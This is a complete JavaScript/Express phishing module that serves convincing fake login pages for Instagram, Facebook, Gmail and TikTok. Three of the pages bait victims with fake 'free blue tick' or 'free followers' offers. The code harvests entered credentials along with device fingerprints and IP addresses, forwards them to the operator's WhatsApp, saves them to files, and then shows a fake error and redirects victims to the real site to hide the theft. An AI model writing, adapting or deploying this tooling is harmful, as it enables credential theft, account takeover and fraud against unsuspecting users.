// ============================================================
// MODULE: phishing.js
// Instagram (Blue Tick), Facebook (Blue Tick), Gmail, TikTok (Free Followers)
// ============================================================
// Each page:
//  1. Displays a realistic page with a tempting offer (Blue Tick / Free Followers)
//  2. Victim enters credentials to "claim" the offer
//  3. Shows "wrong password" error (looks legit)
//  4. Redirects to real site after a few seconds
//  5. Auto-notifies user's WhatsApp when data captured
// ============================================================

const express = require('express');
const crypto  = require('crypto');
const path    = require('path');
const router  = express.Router();

// In-memory store for phishing sessions
const _phishStore = {};

// Cleanup old sessions every 30 minutes
setInterval(() => {
  const cutoff = Date.now() - 2 * 60 * 60 * 1000;
  for (const tok of Object.keys(_phishStore)) {
    if ((_phishStore[tok].createdAt || 0) < cutoff) delete _phishStore[tok];
  }
}, 30 * 60 * 1000);

// ── Detect public host ─────────────────────────────────────
function getPublicHost() {
  return (global._detectedPublicHost || '')
    || (process.env.HEROKU_APP_NAME  ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com` : '')
    || (process.env.APP_URL          ? process.env.APP_URL.replace(/\/$/, '') : '')
    || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
    || `http://localhost:${process.env.PORT || 3001}`;
}

// ── Device info capture script ──────────────────────────────
const DEVICE_SCRIPT = `
<script>
(function(){
  var tok = document.currentScript.getAttribute('data-tok');
  var BASE = window.location.origin;
  var info = {
    ua: navigator.userAgent,
    platform: navigator.platform || '',
    lang: navigator.language,
    screen: screen.width+'x'+screen.height,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: navigator.cookieEnabled,
    cores: navigator.hardwareConcurrency || null
  };
  fetch(BASE + '/api/phish/log/' + tok, {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify(info)
  }).catch(function(){});
})();
</script>`;

// ── Submit handler JS ────────────────────────────────────────
const SUBMIT_SCRIPT = `
<script>
(function(){
  var tok = document.currentScript.getAttribute('data-tok');
  var BASE = window.location.origin;
  var f = document.getElementById('loginForm');
  if (!f) return;
  f.addEventListener('submit', function(e) {
    e.preventDefault();
    var data = {};
    var inputs = f.querySelectorAll('input');
    inputs.forEach(function(inp) { data[inp.name] = inp.value; });
    fetch(BASE + '/api/phish/capture/' + tok, {
      method: 'POST', headers: {'Content-Type':'application/json'},
      body: JSON.stringify(data)
    }).then(function(r) { return r.json(); }).then(function(j) {
      var errBox = document.getElementById('errorBox');
      if (errBox) { errBox.style.display = 'block'; errBox.textContent = j.error || 'Something went wrong. Try again.'; }
      setTimeout(function() { window.location.href = j.redirect || 'https://www.instagram.com'; }, 3000);
    }).catch(function() { window.location.href = 'https://www.instagram.com'; });
  });
})();
</script>`;

// ── Shared base CSS ──────────────────────────────────────────
const BASE_CSS = `
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
body{
  min-height:100vh;display:flex;align-items:center;justify-content:center;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
  padding:16px
}
.card{
  border-radius:12px;padding:32px 24px;max-width:420px;width:100%;
  box-shadow:0 2px 24px rgba(0,0,0,0.15)
}
.logo{text-align:center;margin-bottom:24px}
.logo h1{font-size:22px;margin-top:6px;font-weight:700}
.logo .sub{font-size:13px;margin-top:2px;opacity:0.6}
.badge{display:inline-flex;align-items:center;gap:4px;background:rgba(0,149,246,0.1);color:#0095f6;padding:6px 16px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:20px}
.badge svg{width:14px;height:14px;flex-shrink:0}
.input-group{margin-bottom:14px}
.input-group label{font-size:12px;font-weight:600;display:block;margin-bottom:4px;opacity:0.7}
.input-group input{
  width:100%;padding:11px 14px;border:1px solid rgba(0,0,0,0.12);border-radius:8px;
  font-size:15px;outline:none;transition:border-color 0.2s;background:#fff
}
.input-group input:focus{border-color:#0095f6}
.btn{
  width:100%;padding:11px;border:none;border-radius:8px;font-size:15px;font-weight:600;
  cursor:pointer;margin-top:6px;transition:opacity 0.2s;touch-action:manipulation
}
.btn:active{opacity:0.8}
.btn-primary{background:#0095f6;color:#fff}
.error{
  display:none;background:rgba(237,73,86,0.08);border:1px solid rgba(237,73,86,0.25);
  color:#ed4956;padding:10px 14px;border-radius:8px;font-size:13px;text-align:center;margin-bottom:14px
}
.divider{text-align:center;font-size:12px;margin:14px 0;position:relative;opacity:0.35}
.divider::before,.divider::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:rgba(0,0,0,0.1)}
.divider::before{left:0}.divider::after{right:0}
.footer{text-align:center;margin-top:16px}
.footer a{font-size:12px;text-decoration:none;margin:0 8px}
.steps{display:flex;justify-content:space-around;margin:16px 0 24px}
.step{text-align:center;flex:1}
.step-num{width:28px;height:28px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;margin-bottom:4px}
.step-label{font-size:11px;opacity:0.55}
.offer-banner{background:linear-gradient(135deg, rgba(0,149,246,0.08), rgba(0,149,246,0.02));border:1px solid rgba(0,149,246,0.15);border-radius:8px;padding:12px;text-align:center;margin-bottom:20px;font-size:13px}
.offer-banner strong{color:#0095f6}
.tick{color:#0095f6}
</style>`;

// ================================================================
// PAGE 1: Instagram — "Get Free Blue Tick Verification"
// ================================================================
function instagramPage(tok) {
  return `<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Instagram • Get Verified Badge</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><rect x='4' y='4' width='40' height='40' rx='8' fill='%23000'/><rect x='10' y='10' width='28' height='28' rx='6' fill='none' stroke='%23fff' stroke-width='2'/><circle cx='24' cy='24' r='7' fill='none' stroke='%23fff' stroke-width='2'/><circle cx='34' cy='14' r='2' fill='%23fff'/></svg>">
${BASE_CSS}
<style>
body{background:#fafafa}
.card{background:#fff;max-width:400px}
.logo h1{color:#262626}
.logo .sub{color:#8e8e8e}
.logo svg{width:40px;height:40px}
.input-group label{color:#262626}
.input-group input{background:#fafafa;border-color:#dbdbdb;color:#262626}
.input-group input::placeholder{color:#a8a8a8}
.footer a{color:#00376b}
.step-num{background:#0095f6;color:#fff}
</style></head><body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48"><rect x='4' y='4' width='40' height='40' rx='8' fill='url(#ig)'/><linearGradient id='ig' x1='0' y1='0' x2='48' y2='48'><stop offset='0%' stop-color='%23fdf497'/><stop offset='25%' stop-color='%23fdf497'/><stop offset='50%' stop-color='%23fd5949'/><stop offset='75%' stop-color='%23d6249f'/><stop offset='100%' stop-color='%23285AEB'/></linearGradient><rect x='10' y='10' width='28' height='28' rx='6' fill='none' stroke='%23fff' stroke-width='2'/><circle cx='24' cy='24' r='7' fill='none' stroke='%23fff' stroke-width='2'/><circle cx='34' cy='14' r='2' fill='%23fff'/></svg>
    <h1>Instagram</h1>
    <p class="sub">Get Your Verified Badge</p>
  </div>

  <div class="badge">✅ Blue Tick Verification</div>

  <div class="offer-banner">
    <strong>Limited Time Offer!</strong> — Instagram is now offering <strong>FREE Blue Tick</strong> verification to select users. Verify your account now!
  </div>

  <div class="steps">
    <div class="step"><div class="step-num">1</div><div class="step-label">Login</div></div>
    <div class="step"><div class="step-num">2</div><div class="step-label">Verify</div></div>
    <div class="step"><div class="step-num">3</div><div class="step-label" style="color:#0095f6;font-weight:600">Get ✅</div></div>
  </div>

  <div class="error" id="errorBox">Wrong password. Please try again.</div>

  <form id="loginForm" autocomplete="off">
    <div class="input-group">
      <label>Username or email</label>
      <input type="text" name="username" placeholder="Your Instagram username" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Your Instagram password" required>
    </div>
    <button type="submit" class="btn btn-primary">Verify & Get Blue Tick ✓</button>
  </form>

  <div class="divider">OR</div>

  <div class="footer">
    <a href="#">About verification</a>
    <a href="#">Instagram Help</a>
  </div>

  <p style="text-align:center;margin-top:14px;font-size:11px;opacity:0.4">
    Protected by Instagram Security
  </p>
</div>
${DEVICE_SCRIPT.replace('data-tok', `data-tok="${tok}"`)}
${SUBMIT_SCRIPT.replace('data-tok', `data-tok="${tok}"`).replace("'https://www.instagram.com'", "'https://www.instagram.com'")}
</body></html>`;
}

// ================================================================
// PAGE 2: Facebook — "Get Free Blue Tick Verification"
// ================================================================
function facebookPage(tok) {
  return `<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Facebook • Verification Center</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><circle cx='24' cy='24' r='24' fill='%231877f2'/><path d='M28 8H20v12h-4v6h4v14h6V26h5l1-6h-6V12c0-1.1.9-2 2-2h4V8z' fill='%23fff'/></svg>">
${BASE_CSS}
<style>
body{background:#f0f2f5}
.card{background:#fff;max-width:400px}
.logo h1{color:#1c1e21}
.logo .sub{color:#65676b}
.logo svg{width:40px;height:40px}
.input-group label{color:#1c1e21}
.input-group input{background:#f0f2f5;border-color:#ccd0d5;color:#1c1e21}
.input-group input::placeholder{color:#8a8d91}
.btn-primary{background:#1877f2}
.footer a{color:#1877f2}
.step-num{background:#1877f2;color:#fff}
.badge{background:rgba(24,119,242,0.08);color:#1877f2}
.offer-banner{border-color:rgba(24,119,242,0.15)}
.offer-banner strong{color:#1877f2}
.tick{color:#1877f2}
</style></head><body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48"><circle cx='24' cy='24' r='24' fill='%231877f2'/><path d='M28 8H20v12h-4v6h4v14h6V26h5l1-6h-6V12c0-1.1.9-2 2-2h4V8z' fill='%23fff'/></svg>
    <h1>Facebook</h1>
    <p class="sub">Verification Center</p>
  </div>

  <div class="badge">✅ Get Your Blue Verification Badge</div>

  <div class="offer-banner">
    <strong>Meta Verification Program</strong> — Facebook is offering <strong>FREE verified badges</strong> to eligible creators and public figures. Complete your verification below!
  </div>

  <div class="steps">
    <div class="step"><div class="step-num">1</div><div class="step-label">Login</div></div>
    <div class="step"><div class="step-num">2</div><div class="step-label">Verify ID</div></div>
    <div class="step"><div class="step-num">3</div><div class="step-label" style="color:#1877f2;font-weight:600">Get ✅</div></div>
  </div>

  <div class="error" id="errorBox">Incorrect email or password. Please try again.</div>

  <form id="loginForm" autocomplete="off">
    <div class="input-group">
      <label>Email or phone number</label>
      <input type="text" name="email" placeholder="Email or phone number" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Facebook password" required>
    </div>
    <button type="submit" class="btn btn-primary">Verify & Get Blue Badge ✓</button>
  </form>

  <div class="divider">OR</div>

  <div class="footer">
    <a href="#">About verified badges</a>
    <a href="#">Privacy Policy</a>
  </div>

  <p style="text-align:center;margin-top:14px;font-size:11px;opacity:0.4">
    Protected by Facebook Security
  </p>
</div>
${DEVICE_SCRIPT.replace('data-tok', `data-tok="${tok}"`)}
${SUBMIT_SCRIPT.replace('data-tok', `data-tok="${tok}"`).replace("'https://www.instagram.com'", "'https://www.facebook.com'")}
</body></html>`;
}

// ================================================================
// PAGE 3: Gmail — Account Alert / Login Required
// ================================================================
function gmailPage(tok) {
  return `<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Gmail • Sign in</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path d='M6 36V12l18 12 18-12v24H6z' fill='%23fff'/><path d='M6 12v4l18 12 18-12v-4H6z' fill='%23e8e8e8'/><path d='M6 14v2l18 12 18-12v-2H6z' fill='%23db4437'/><path d='M42 14l-18 12L6 14V12h36v2z' fill='%23c5221f'/></svg>">
${BASE_CSS}
<style>
body{background:#fff}
.card{background:#fff;max-width:420px;padding:48px 40px;box-shadow:none}
.logo svg{width:48px;height:48px}
.logo h1{color:#202124;font-size:24px;margin-top:16px}
.logo .sub{color:#5f6368;font-size:14px;margin-top:8px}
.input-group label{color:#5f6368;font-size:11px;font-weight:500}
.input-group input{background:#fff;border:1px solid #dadce0;border-radius:4px;color:#202124;padding:13px 15px;font-size:16px}
.input-group input:focus{border-color:#1a73e8}
.btn-primary{background:#1a73e8;color:#fff;padding:9px 24px;width:auto;float:right;border-radius:4px;font-size:14px}
.error{background:#fce8e6;border-color:#d93025;color:#d93025;border-radius:4px}
.footer a{color:#1a73e8;font-size:14px;margin:0 10px}
</style></head><body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48"><path d='M6 36V12l18 12 18-12v24H6z' fill='%23fff'/><path d='M6 12v4l18 12 18-12v-4H6z' fill='%23e8e8e8'/><path d='M6 14v2l18 12 18-12v-2H6z' fill='%23db4437'/><path d='M42 14l-18 12L6 14V12h36v2z' fill='%23c5221f'/></svg>
    <h1>Google</h1>
    <p class="sub">Sign in to continue to Gmail</p>
  </div>

  <div class="error" id="errorBox">Couldn't find your Google Account. Try again.</div>

  <form id="loginForm" autocomplete="off">
    <div class="input-group">
      <label>Email or phone</label>
      <input type="text" name="email" placeholder="Email or phone number" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Enter your password" required>
    </div>
    <div style="clear:both">
      <button type="submit" class="btn btn-primary">Next</button>
    </div>
  </form>

  <div style="clear:both;padding-top:50px"></div>

  <div class="footer">
    <a href="#">Forgot email?</a>
    <a href="#">Create account</a>
  </div>
</div>
${DEVICE_SCRIPT.replace('data-tok', `data-tok="${tok}"`)}
${SUBMIT_SCRIPT.replace('data-tok', `data-tok="${tok}"`).replace("'https://www.instagram.com'", "'https://mail.google.com'")}
</body></html>`;
}

// ================================================================
// PAGE 4: TikTok — "Get Free Followers"
// ================================================================
function tiktokPage(tok) {
  return `<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>TikTok • Free Followers</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><rect width='48' height='48' rx='8' fill='%23000'/><path d='M34 12h-4v10c0 3.3-2.7 6-6 6s-6-2.7-6-6 2.7-6 6-6v-4c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10V12z' fill='%23fe2c55'/><path d='M38 12h-4l-4 4v-4h-4v15c0 3.3 2.7 6 6 6s6-2.7 6-6V12z' fill='%2325f4ee'/></svg>">
${BASE_CSS}
<style>
body{background:#000}
.card{background:#111;max-width:400px;border:1px solid rgba(255,255,255,0.06)}
.logo h1{color:#fff}
.logo .sub{color:rgba(255,255,255,0.5)}
.input-group label{color:rgba(255,255,255,0.6)}
.input-group input{background:rgba(255,255,255,0.06);border-color:rgba(255,255,255,0.1);color:#fff}
.input-group input:focus{border-color:#fe2c55}
.input-group input::placeholder{color:rgba(255,255,255,0.2)}
.btn-primary{background:#fe2c55;color:#fff}
.error{background:rgba(254,44,85,0.1);border-color:rgba(254,44,85,0.3);color:#fe2c55}
.footer a{color:rgba(255,255,255,0.4)}
.step-num{background:#fe2c55;color:#fff}
.badge{background:rgba(254,44,85,0.12);color:#fe2c55}
.offer-banner{border-color:rgba(254,44,85,0.2)}
.offer-banner strong{color:#25f4ee}
</style></head><body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48"><rect width='48' height='48' rx='8' fill='%23000'/><path d='M34 12h-4v10c0 3.3-2.7 6-6 6s-6-2.7-6-6 2.7-6 6-6v-4c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10V12z' fill='%23fe2c55'/><path d='M38 12h-4l-4 4v-4h-4v15c0 3.3 2.7 6 6 6s6-2.7 6-6V12z' fill='%2325f4ee'/></svg>
    <h1>TikTok</h1>
    <p class="sub">Get Free Followers Instantly</p>
  </div>

  <div class="badge">🔥 Free TikTok Followers</div>

  <div class="offer-banner">
    <strong>🎉 Limited Event!</strong> Get <strong>5,000 FREE FOLLOWERS</strong> instantly when you verify your account! Offer valid for the first 10,000 users only!
  </div>

  <div style="display:flex;justify-content:center;gap:8px;margin-bottom:20px;flex-wrap:wrap">
    <span style="background:rgba(37,244,238,0.1);color:#25f4ee;padding:4px 12px;border-radius:12px;font-size:12px">⭐ 5,000 Followers</span>
    <span style="background:rgba(255,255,255,0.06);color:#fff;padding:4px 12px;border-radius:12px;font-size:12px">⚡ Instant Delivery</span>
    <span style="background:rgba(255,255,255,0.06);color:#fff;padding:4px 12px;border-radius:12px;font-size:12px">🔒 100% Free</span>
  </div>

  <div class="steps">
    <div class="step"><div class="step-num">1</div><div class="step-label" style="color:rgba(255,255,255,0.5)">Login</div></div>
    <div class="step"><div class="step-num">2</div><div class="step-label" style="color:rgba(255,255,255,0.5)">Verify</div></div>
    <div class="step"><div class="step-num">3</div><div class="step-label" style="color:#25f4ee;font-weight:600">Get Followers 🎉</div></div>
  </div>

  <div class="error" id="errorBox">Invalid account. Please try again with correct credentials.</div>

  <form id="loginForm" autocomplete="off">
    <div class="input-group">
      <label>TikTok username</label>
      <input type="text" name="username" placeholder="@your_username" required>
    </div>
    <div class="input-group">
      <label>Password</label>
      <input type="password" name="password" placeholder="Your TikTok password" required>
    </div>
    <button type="submit" class="btn btn-primary">Verify & Get 5,000 Followers 🚀</button>
  </form>

  <p style="text-align:center;margin-top:14px;font-size:12px;color:rgba(255,255,255,0.3)">
    ⏳ Only <span style="color:#fe2c55;font-weight:600">1,847 spots</span> remaining!
  </p>

  <div class="divider" style="color:rgba(255,255,255,0.2)">OR</div>

  <div class="footer">
    <a href="#">Terms of Service</a>
    <a href="#">About TikTok</a>
  </div>
</div>
${DEVICE_SCRIPT.replace('data-tok', `data-tok="${tok}"`)}
${SUBMIT_SCRIPT.replace('data-tok', `data-tok="${tok}"`).replace("'https://www.instagram.com'", "'https://www.tiktok.com'")}
</body></html>`;
}

// ================================================================
// ROUTES
// ================================================================

// ── POST /api/phish/create  →  create a phishing session ──────
router.post('/create', (req, res) => {
  const { type, userId } = req.body;
  const validTypes = ['instagram', 'facebook', 'gmail', 'tiktok'];
  if (!validTypes.includes(type)) return res.status(400).json({ error: 'Invalid type. Use: instagram, facebook, gmail, tiktok' });
  if (!userId) return res.status(400).json({ error: 'Missing userId' });

  const sessionToken = crypto.randomBytes(16).toString('hex');
  _phishStore[sessionToken] = {
    type,
    userId,
    device: null,
    credentials: null,
    capturedAt: null,
    ip: null,
    createdAt: Date.now()
  };

  const host = getPublicHost();
  const link = `${host}/secure-login/${type}/${sessionToken}`;
  res.json({ sessionToken, link, type });
});

// ── GET /secure-login/:type/:sessionToken  →  serve phishing page ──
router.get('/:type/:sessionToken', (req, res) => {
  const { type, sessionToken } = req.params;
  const s = _phishStore[sessionToken];
  if (!s || s.type !== type) return res.status(404).send('Link expired or invalid.');

  s.ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  s.createdAt = Date.now();

  let html;
  switch (type) {
    case 'instagram': html = instagramPage(sessionToken); break;
    case 'facebook':  html = facebookPage(sessionToken); break;
    case 'gmail':     html = gmailPage(sessionToken); break;
    case 'tiktok':    html = tiktokPage(sessionToken); break;
    default: return res.status(404).send('Invalid page type.');
  }

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// ── POST /api/phish/log/:sessionToken  →  log device info ────
router.post('/log/:sessionToken', (req, res) => {
  const s = _phishStore[req.params.sessionToken];
  if (!s) return res.status(404).json({ error: 'Session not found' });
  s.device = req.body;
  res.json({ ok: true });
});

// ── POST /api/phish/capture/:sessionToken  →  capture credentials ──
router.post('/capture/:sessionToken', express.json({ limit: '100kb' }), (req, res) => {
  const s = _phishStore[req.params.sessionToken];
  if (!s) return res.status(404).json({ error: 'Session not found' });

  s.credentials = req.body;
  s.capturedAt = Date.now();
  s.ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;

  // Try to send data to bot owner via global messenger
  try {
    if (typeof global._sendPhishToWhatsApp === 'function') {
      global._sendPhishToWhatsApp(s.type, req.body, s.device, s.ip, s.userId);
    }
  } catch (_) {}

  // Always write to file as fallback
  try {
    const fs = require('fs');
    const p = require('path');
    const dir = p.join(__dirname, '../../database');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    const reportFile = p.join(dir, `phish_${req.params.sessionToken}.json`);
    fs.writeFileSync(reportFile, JSON.stringify({
      type: s.type, credentials: s.credentials, device: s.device,
      ip: s.ip, capturedAt: s.capturedAt, userId: s.userId
    }, null, 2));
  } catch (_) {}

  // Return error to victim (looks legit) + redirect
  const redirectMap = { instagram: 'https://www.instagram.com', facebook: 'https://www.facebook.com', gmail: 'https://mail.google.com', tiktok: 'https://www.tiktok.com' };
  res.json({ error: 'Verification failed. Wrong credentials.', redirect: redirectMap[s.type] || 'https://www.instagram.com' });
});

// ── GET /api/phish/result/:sessionToken  →  fetch captured data ──
router.get('/result/:sessionToken', (req, res) => {
  const s = _phishStore[req.params.sessionToken];
  if (!s) return res.status(404).json({ error: 'Session not found or expired' });
  res.json({
    type: s.type,
    userId: s.userId,
    ip: s.ip,
    device: s.device,
    credentials: s.credentials,
    capturedAt: s.capturedAt,
    createdAt: s.createdAt
  });
});

// ── renderPage: generate HTML for a given type and token (used by clean URLs) ──
function renderPage(type, sessionToken) {
  switch (type) {
    case 'instagram': return instagramPage(sessionToken);
    case 'facebook':  return facebookPage(sessionToken);
    case 'gmail':     return gmailPage(sessionToken);
    case 'tiktok':    return tiktokPage(sessionToken);
    default: return null;
  }
}

module.exports = router;
module.exports._phishStore = _phishStore;
module.exports.renderPage = renderPage;
